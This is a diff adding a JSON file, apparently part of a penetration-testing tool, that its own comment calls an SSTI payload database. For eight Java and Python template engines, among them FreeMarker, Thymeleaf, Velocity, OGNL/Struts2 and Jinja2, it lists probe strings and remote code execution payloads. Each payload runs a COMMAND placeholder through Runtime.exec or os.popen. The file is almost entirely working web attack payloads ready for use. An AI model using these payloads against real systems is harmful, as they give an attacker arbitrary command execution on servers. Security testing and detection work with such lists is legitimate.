@@ -1,0 +1,54 @@
+{
+  "_comment": "SSTI (Server-Side Template Injection) payload database. COMMAND is replaced at runtime.",
+  "SpEL": {
+    "_description": "Spring Expression Language — used in Spring MVC, Spring Boot",
+    "probe": "{\"query\": \"{{7*7}}\"}",
+    "expected": "49",
+    "rce": "{\"query\": \"{{T(java.lang.Runtime).getRuntime().exec(\\\"COMMAND\\\")}}\"}"
+  },
+  "FreeMarker": {
+    "_description": "Apache FreeMarker — common in Java web apps",
+    "probe": "${7*7}",
+    "expected": "49",
+    "rce": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"COMMAND\")}",
+    "rce_alt": "<#assign classLoader=object.class.protectionDomain.classLoader><#assign owc=classLoader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classLoader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"COMMAND\")}"
+  },
+  "Thymeleaf": {
+    "_description": "Thymeleaf — popular in Spring Boot projects",
+    "probe": "[[${7*7}]]",
+    "expected": "49",
+    "rce": "__${T(java.lang.Runtime).getRuntime().exec(\"COMMAND\")}__::.x",
+    "rce_alt": "/*[[${T(java.lang.Runtime).getRuntime().exec(\"COMMAND\")}]]*/"
+  },
+  "Velocity": {
+    "_description": "Apache Velocity — legacy Java template engine",
+    "probe": "#set($x=7*7)$x",
+    "expected": "49",
+    "rce": "#set($rt = $class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null))#set($proc = $rt.exec('COMMAND'))$proc"
+  },
+  "Groovy": {
+    "_description": "Groovy template engine (GSP) — used in Grails",
+    "probe": "${7*7}",
+    "expected": "49",
+    "rce": "${groovy.lang.Runtime.getRuntime().exec('COMMAND').text}"
+  },
+  "OGNL": {
+    "_description": "Object-Graph Navigation Language — used in Apache Struts2",
+    "probe": "%{7*7}",
+    "expected": "49",
+    "rce": "%{@java.lang.Runtime@getRuntime().exec('COMMAND')}",
+    "rce_struts": "%{''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'COMMAND')}"
+  },
+  "Pebble": {
+    "_description": "Pebble Java template engine",
+    "probe": "{{ 7 * 7 }}",
+    "expected": "49",
+    "rce": "{% set cmd = 'COMMAND' %}{% set runtime = 'java.lang.Runtime'.toClass().getRuntime() %}{% set proc = runtime.exec(cmd) %}{{ proc.text }}"
+  },
+  "Jinja2": {
+    "_description": "Jinja2 — Python template engine (for mixed stacks)",
+    "probe": "{{7*7}}",
+    "expected": "49",
+    "rce": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('COMMAND').read()}}"
+  }
+}
